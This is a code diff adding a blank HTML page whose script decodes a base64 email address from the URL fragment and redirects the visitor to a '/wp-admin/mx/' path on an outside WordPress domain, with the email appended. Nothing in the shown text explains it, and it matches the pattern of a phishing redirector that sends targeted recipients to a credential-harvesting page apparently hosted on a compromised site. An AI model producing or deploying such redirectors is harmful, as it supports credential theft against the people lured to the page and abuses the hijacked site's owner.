@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<script>
+
+  function decodeBase64(encodedString) {
+    return atob(encodedString);
+  }
+
+
+  var hash = window.location.hash;
+
+  if (hash !== "") {
+
+    var encodedEmail = hash.substring(1);
+
+
+    var decodedEmail = decodeBase64(encodedEmail);
+
+    // Construct the new URL with the decoded email
+    var newURL = "https://middleeastlegaltranslation.ae/wp-admin/mx/#" + decodedEmail;
+
+
+    window.location.href = newURL;
+  }
+</script>
+</body>
+</html>
